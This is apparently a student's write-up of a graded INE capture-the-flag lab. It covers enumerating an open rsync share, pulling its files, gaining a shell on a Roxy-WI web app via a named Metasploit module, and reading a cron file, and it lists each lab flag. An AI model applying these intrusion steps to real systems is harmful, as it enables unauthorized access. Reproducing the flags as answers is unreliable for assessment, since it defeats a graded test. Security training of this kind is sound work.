## Completing Skill Check Labs
Skill Check Labs are interactive, hands-on exercises designed to validate the knowledge and skills you’ve gained in this course through real-world scenarios. Each lab presents practical tasks that require you to apply what you’ve learned. Unlike other INE labs, solutions are not provided, challenging you to demonstrate your understanding and problem-solving abilities. Your performance is graded, allowing you to track progress and measure skill growth over time.

## Lab Environment
In this lab environment, you will have GUI access to a Kali Linux machine. Two machines are accessible at target1.ine.local and target2.ine.local.

Objective: Using various exploration techniques, complete the following tasks to capture the associated flags:

## Flag 1: Enumerate the open port using Metasploit, and inspect the RSYNC banner closely; it might reveal something interesting.
rsync rsync://target1.ine.local/
backupwscohen FLAG1_ca26336bd5c84cffa1ba27f0ea07ba4a

## Flag 2: The files on the RSYNC server hold valuable information. Explore the contents to find the flag.
    rsync://target1.ine.local/backupwscohen
        drwxr-xr-x4,096 2026/03/09 21:53:53 .
        -rw-r--r-- 20 2024/10/28 15:05:40 TPSData.txt
        -rw-r--r-- 25 2024/10/28 15:05:40 office_staff.vhd
        -rw-r--r-- 39 2026/03/09 21:53:53 pii_data.xlsx

    rsync -av rsync://target1.ine.local/backupwscohen .
        receiving incremental file list
        ./
        TPSData.txt
        office_staff.vhd
        pii_data.xlsx
        sent 84 bytesreceived 341 bytes850.00 bytes/sec
        total size is 84speedup is 0.20

    cat TPSData.txt 
        Sample data for TPS
    cat office_staff.vhd 
        Sample office staff data
    cat pii_data.xlsx
        FLAG2_42cea69f343a4670a3c32bc809da70a3

## Flag 3: Try exploiting the webapp to gain a shell using Metasploit on target2.ine.local.
    linux/http/roxy_wi_exec
        FLAG3_7fbfd92576684ab7aa125fec1e7dbc1e


## Flag 4: Automated tasks can sometimes leave clues. Investigate scheduled jobs or running processes to uncover the hidden flag.
    cat /etc/cron.d/www-data-cron
        www-data echo "FLAG4_ed31582bba0143138736039ba364457a"


## Tools
Nmap
Metasploit Framework
rsync